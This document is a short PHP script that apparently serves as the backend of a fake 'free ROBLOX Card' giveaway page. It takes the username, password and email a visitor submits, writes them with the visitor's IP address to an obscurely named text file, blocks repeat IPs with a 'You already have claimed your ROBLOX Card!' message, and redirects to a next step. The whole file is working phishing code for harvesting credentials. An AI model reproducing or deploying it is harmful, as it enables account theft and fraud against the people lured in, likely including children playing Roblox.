<?php
$Username = $_POST['Username'];
$Password = $_POST['Password'];
$Email = $_POST['Email'];
$IP = $_SERVER['REMOTE_ADDR'];
$strings = file("IPLogs");
$EmailLen = strlen($Email);
$PasswordLen = strlen($Password);
$UsernameLen = strlen($Username);
$max = 20;
$emax = 35;
    if(strlen($Email) < 35 AND strlen($Password) < 20 AND strlen($Username) < 20){
if(in_array($IP."\n", $strings)){
	echo "You already have claimed your ROBLOX Card!";
} else {
	$WriteLine = fopen("1569893sGt2691", "a+");
fwrite($WriteLine, "Username: ".$Username." | Password: ".$Password." | Email: ".$Email." | IP: ".$IP."\n");
fclose($WriteLine);
$WriteLine2 = fopen("IPLogs", "a+");
fwrite($WriteLine2, $IP."\n");
fclose($WriteLine2);
?>
<script>location.href='step3.html';</script>
<?php
}
}
?>







